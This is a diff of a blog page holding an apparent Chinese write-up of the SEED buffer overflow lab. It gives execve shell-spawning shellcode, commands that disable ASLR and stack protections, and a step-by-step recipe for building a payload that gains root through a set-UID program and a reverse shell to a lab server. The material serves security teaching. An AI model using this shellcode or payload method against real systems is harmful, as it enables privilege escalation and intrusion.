@@ -101,7 +101,7 @@ var _hmt = _hmt || [];
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">743</span>
+            <span class="post-count">1.7k</span>
         </span>
     </span>
 
@@ -110,7 +110,7 @@ var _hmt = _hmt || [];
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">2 min</span>
+            <span class="post-count">7 min</span>
         </span>
     </span>
 </div>
@@ -125,13 +125,64 @@ var _hmt = _hmt || [];
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="Buffer-Overflow-Attack-Lab"><a href="#Buffer-Overflow-Attack-Lab" class="headerlink" title="Buffer_Overflow_Attack_Lab"></a>Buffer_Overflow_Attack_Lab</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>缓冲区溢出指的是程序试图将数据写入缓冲区以外的情况。</p>
+  <h1 id="Buffer-Overflow-Attack-Lab"><a href="#Buffer-Overflow-Attack-Lab" class="headerlink" title="Buffer_Overflow_Attack_Lab"></a>Buffer_Overflow_Attack_Lab</h1><h2 id="Set-UID版本"><a href="#Set-UID版本" class="headerlink" title="Set-UID版本"></a>Set-UID版本</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>缓冲区溢出指的是程序试图将数据写入缓冲区以外的情况。</p>
 <p>这种漏洞可以由恶意用户使用来改变程序的流量控制，导致执行恶意代码</p>
 <p>本实验的目标是为学生提供对这种类型的漏洞的实用洞察力，并学习如何利用攻击中的漏洞</p>
-<h2 id="Lab-Environment-Setup"><a href="#Lab-Environment-Setup" class="headerlink" title="Lab Environment Setup"></a>Lab Environment Setup</h2><h3 id="关闭地址空间随机化"><a href="#关闭地址空间随机化" class="headerlink" title="关闭地址空间随机化"></a>关闭地址空间随机化</h3><p>ALSR对程序内存中的一些关键数据区域进行随机化，包括栈的位置、堆和库的位置等。</p>
+<h3 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h3><h4 id="关闭地址空间随机化"><a href="#关闭地址空间随机化" class="headerlink" title="关闭地址空间随机化"></a>关闭地址空间随机化</h4><p>系统会随机化堆和堆栈的起始地址。猜测地址是缓冲溢出攻击的关键步骤之一。可以使用以下命令丢弃此功能：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<h4 id="配置-bin-sh"><a href="#配置-bin-sh" class="headerlink" title="配置/bin/sh"></a>配置/bin/sh</h4><p>因为现在/bin/sh符号链接指向/bin/dash，而在第一次实验中，我们知道dash对set-UID程序有个安全策略，放弃特权。</p>
+<p>所以我们需要改变符号链接到/bin/zsh，使用如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -sf /bin/zsh /bin/sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="StackGuard和不可执行栈"><a href="#StackGuard和不可执行栈" class="headerlink" title="StackGuard和不可执行栈"></a>StackGuard和不可执行栈</h4><p>这个会在编译时关闭，这两个也是保护程序安全的策略，之后会讨论</p>
+<h3 id="Task-1-Getting-Familiar-with-Shellcode"><a href="#Task-1-Getting-Familiar-with-Shellcode" class="headerlink" title="Task 1: Getting Familiar with Shellcode"></a>Task 1: Getting Familiar with Shellcode</h3><p>提供三个版本的shellcode：c版本、32-bit和64-bit，这里只提供c</p>
+<h4 id="c-version"><a href="#c-version" class="headerlink" title="c version"></a>c version</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//意思是，shellcode就是调用了一个/bin/sh</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Task-Invoking-the-Shellcode"><a href="#Task-Invoking-the-Shellcode" class="headerlink" title="Task: Invoking the Shellcode"></a>Task: Invoking the Shellcode</h4><p>源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> shellcode[] =                     <span class="comment">//就是汇编代码的二进制形式</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __x86_64__                              </span></span><br><span class="line">    <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">    <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">    <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">    <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> code[<span class="number">500</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(code, shellcode); <span class="comment">// Copy the shellcode to the stack</span></span><br><span class="line">    <span class="keyword">int</span> (*func)() = (<span class="keyword">int</span>(*)())code;</span><br><span class="line">    func(); <span class="comment">// Invoke the shellcode from the stack</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为已经提供了Makefile文件，所以可以很简单的实现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make             <span class="comment">#生成a32.out和a64.out</span></span><br><span class="line">./a32.out        <span class="comment">#调用shell </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Task-2-Understanding-the-Vulnerable-Program"><a href="#Task-2-Understanding-the-Vulnerable-Program" class="headerlink" title="Task 2: Understanding the Vulnerable Program"></a>Task 2: Understanding the Vulnerable Program</h3><p>从源码审计知道：</p>
+<ol>
+<li>漏洞出在bof函数中的<code>strcpy(buffer, str)</code>函数</li>
+<li>我们需要在badfile文件中填入payload造成缓冲区溢出漏洞</li>
+</ol>
+<p>准备四个难度的Level，已经提供了相应的Makefile</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">make                     <span class="comment"># 利用以下命令生成4个Level</span></span><br><span class="line"><span class="comment"># gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c </span></span><br><span class="line"><span class="comment"># sudo chown root stack</span></span><br><span class="line"><span class="comment"># sudo chmod 4755 stack</span></span><br><span class="line"><span class="comment"># 知道程序是32位程序，编译时关闭了前面提到的两个安全策略，最后是属于root用户的set-uid程序</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Task-3-Launching-Attack-on-32-bit-Program-Level-1"><a href="#Task-3-Launching-Attack-on-32-bit-Program-Level-1" class="headerlink" title="Task 3: Launching Attack on 32-bit Program (Level 1)"></a>Task 3: Launching Attack on 32-bit Program (Level 1)</h3><p>按如下步骤发动缓冲区溢出攻击：</p>
+<ol>
+<li><code>gdb stack-L1-dbg</code>得到bof函数的地址以及buffer的地址<br><img src="/2021/11/09/SEED_lab3/image-20211110172748213.png" alt="image-20211110172748213"></li>
+<li>创建badfile文件，<code>touch badfile</code></li>
+<li>修改exploit.py文件<br><img src="/2021/11/09/SEED_lab3/image-20211110173007659.png" alt="image-20211110173007659"></li>
+<li>生成payload并攻击<br><img src="/2021/11/09/SEED_lab3/image-20211110173120280.png" alt="image-20211110173120280"></li>
+<li>可以看到我们成功拿到root权限</li>
+</ol>
+<p>如何修改exploit？</p>
+<ol>
+<li>shellcode是复制的，就是shellcode的32bit汇编版本</li>
+<li>ret是返回地址，返回shellcode的第一条指令</li>
+<li>offset是ebp和buffer地址的间隔</li>
+<li>L等于4是32位程序</li>
+</ol>
+<h3 id="Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2"><a href="#Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2" class="headerlink" title="Task 4: Launching Attack without Knowing Buffer Size (Level 2)"></a>Task 4: Launching Attack without Knowing Buffer Size (Level 2)</h3><p>不知道缓冲区大小，但是知道缓冲区大小的范围是100-200</p>
+<p>所以我们其实不知道的是offset的大小，只查看buffer的地址吧。</p>
+<p><img src="/2021/11/09/SEED_lab3/image-20211110203921358.png" alt="image-20211110203921358"></p>
+<p>修改exploit.py</p>
+<p><img src="/2021/11/09/SEED_lab3/image-20211110204203357.png" alt="image-20211110204203357"></p>
+<p>攻击成功</p>
+<p><img src="/2021/11/09/SEED_lab3/image-20211110204241360.png" alt="image-20211110204241360"></p>
+<h3 id="Task-5-Launching-Attack-on-64-bit-Program-Level-3"><a href="#Task-5-Launching-Attack-on-64-bit-Program-Level-3" class="headerlink" title="Task 5: Launching Attack on 64-bit Program (Level 3)"></a>Task 5: Launching Attack on 64-bit Program (Level 3)</h3><p>同上一个任务类似，但是这次是64位的程序</p>
+<h2 id="Server版本"><a href="#Server版本" class="headerlink" title="Server版本"></a>Server版本</h2><h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><p>缓冲区溢出指的是程序试图将数据写入缓冲区以外的情况。</p>
+<p>这种漏洞可以由恶意用户使用来改变程序的流量控制，导致执行恶意代码</p>
+<p>本实验的目标是为学生提供对这种类型的漏洞的实用洞察力，并学习如何利用攻击中的漏洞</p>
+<h3 id="Lab-Environment-Setup"><a href="#Lab-Environment-Setup" class="headerlink" title="Lab Environment Setup"></a>Lab Environment Setup</h3><h4 id="关闭地址空间随机化-1"><a href="#关闭地址空间随机化-1" class="headerlink" title="关闭地址空间随机化"></a>关闭地址空间随机化</h4><p>ALSR对程序内存中的一些关键数据区域进行随机化，包括栈的位置、堆和库的位置等。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /sbin/sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>
 
-<h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><p>实验所用的漏洞程序是<code>server-code</code>文件夹的<code>stack.c</code>程序。</p>
+<h4 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h4><p>实验所用的漏洞程序是<code>server-code</code>文件夹的<code>stack.c</code>程序。</p>
 <p>我们的任务是利用这个漏洞得到root权限。</p>
 <p>程序拥有root权限，运行在一个服务器中，它的标准输入被重定向到一个在远程用户和服务器之间的TCP连接。</p>
 <p>就是说，程序能从一个远程用户得到数据。</p>
@@ -144,10 +195,10 @@ var _hmt = _hmt || [];
 <p><img src="/2021/11/09/SEED_lab3/image-20211109151506071.png" alt="image-20211109151506071"></p>
 <p><code>server-code</code>文件夹里的<code>server.c</code>是服务器入口点，监听9090端口</p>
 <p>当收到TCP连接时，会将TCP收到的数据作为标准输入到<code>stack</code>程序，我们没必要去读<code>server.c</code>的源码。</p>
-<h3 id="容器搭建和命令"><a href="#容器搭建和命令" class="headerlink" title="容器搭建和命令"></a>容器搭建和命令</h3><p>起环境，docker容器</p>
+<h4 id="容器搭建和命令"><a href="#容器搭建和命令" class="headerlink" title="容器搭建和命令"></a>容器搭建和命令</h4><p>起环境，docker容器</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dcbuild      <span class="comment"># alias for: docker-compose build</span></span><br><span class="line">dcup         <span class="comment"># alias for: docker-compose up</span></span><br><span class="line">dcdown       <span class="comment"># alias for: docker-compose down</span></span><br><span class="line">dockps       <span class="comment"># Alias for: docker ps --format &quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span></span><br><span class="line">docksh &lt;id&gt;  <span class="comment"># Alias for: docker exec -it &lt;id&gt; /bin/bash</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h2 id="Task-1-Get-Familiar-with-the-Shellcode"><a href="#Task-1-Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1: Get Familiar with the Shellcode"></a>Task 1: Get Familiar with the Shellcode</h2><p>Shellcode通常被用在代码注入攻击。它基本上是一段启动shell的代码，通常用汇编语言编写。</p>
+<h3 id="Task-1-Get-Familiar-with-the-Shellcode"><a href="#Task-1-Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1: Get Familiar with the Shellcode"></a>Task 1: Get Familiar with the Shellcode</h3><p>Shellcode通常被用在代码注入攻击。它基本上是一段启动shell的代码，通常用汇编语言编写。</p>
 <p>在本实验中只提供二进制版本的shellcode</p>
 <ol>
 <li><p>生成32位和64位二进制shellcode文件<code>codefile32</code>和<code>codefile64</code></p>
@@ -160,20 +211,30 @@ var _hmt = _hmt || [];
 <li><p>修改shellcode，可以用来删除文件，<br><img src="/2021/11/09/SEED_lab3/image-20211109223939250.png" alt="image-20211109223939250"><br><img src="/2021/11/09/SEED_lab3/image-20211109223844600.png" alt="image-20211109223844600"></p>
 </li>
 </ol>
-<h2 id="Task-2-Level-1-Attack"><a href="#Task-2-Level-1-Attack" class="headerlink" title="Task 2: Level-1 Attack"></a>Task 2: Level-1 Attack</h2><p>第一个目标是10.9.0.0端口是9090，漏洞程序stack是32位程序。</p>
+<h3 id="Task-2-Level-1-Attack"><a href="#Task-2-Level-1-Attack" class="headerlink" title="Task 2: Level-1 Attack"></a>Task 2: Level-1 Attack</h3><p>第一个目标是10.9.0.0端口是9090，漏洞程序stack是32位程序。</p>
 <p>服务器将接受517字节的输入，会造成缓冲区溢出。</p>
 <ol>
 <li>先测试我们的服务器是否正常、<br><img src="/2021/11/09/SEED_lab3/image-20211109225003621.png" alt="image-20211109225003621"><br>正常返回，我们得到了栈帧指针的值<code>ebp</code>和buffer的地址</li>
 <li>我们修改位于<code>attack-code</code>文件夹下面的<code>exploit.py</code>，构造我们的payload<br><img src="/2021/11/09/SEED_lab3/image-20211109230829919.png" alt="image-20211109230829919"><br><img src="/2021/11/09/SEED_lab3/image-20211109231006268.png" alt="image-20211109231006268"></li>
 <li>监听9090端口，反向shell得到root权限<br><img src="/2021/11/09/SEED_lab3/image-20211109232608115.png" alt="image-20211109232608115"></li>
 </ol>
-<p>构造content，也就是最后badfile文件内容：</p>
+<p>Level-1给了2个Hint：</p>
 <ol>
-<li>先用NOP空指令将数组填充</li>
-<li>[0:offset]，就是NOP指令，正常数组值。</li>
-<li>[offset:offset+4]，就是ret指令返回的地址</li>
-<li>[517-len(shellcode):517]，填充shellcode</li>
+<li>ebp地址</li>
+<li>buffer地址</li>
 </ol>
+<p>从hint中我们得到buffer的大小为offset，构造content，也就是最后badfile文件内容：</p>
+<ol>
+<li>先用NOP空指令将content数组填充</li>
+<li>[0:offset]，内容是NOP指令，缓冲区数据。</li>
+<li>[offset:offset+4]，就是ret指令返回的地址（小端法），我们要执行恶意代码，最小为ebp+8最大为517-len(shellcode)</li>
+<li>[517-len(shellcode):517]，填充shellcode恶意代码</li>
+</ol>
+<h3 id="Task-3-Level-2-Attack"><a href="#Task-3-Level-2-Attack" class="headerlink" title="Task 3: Level-2 Attack"></a>Task 3: Level-2 Attack</h3><p>为了增加难度，在本任务中将不会给出ebp地址</p>
+<p><img src="/2021/11/09/SEED_lab3/image-20211110140909438.png" alt="image-20211110140909438"></p>
+<p>如图所示只给出了buffer的地址，我们不知道buffer的大小。</p>
+<p>同时，为了降低难度，缓冲区的大小被设定为<code>[100,300]</code>。</p>
+<p>所以解法是暴力枚举，每个大小都试一下</p>
  
       <!-- reward -->
       
@@ -250,6 +311,15 @@ var _hmt = _hmt || [];
 
    
   <nav class="article-nav">
+    
+      <a href="/2021/11/26/hidden_tear/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Hidden Tear 勒索病毒
+          
+        </div>
+      </a>
     
     
       <a href="/2021/10/28/SEED_lab2/" class="article-nav-link">
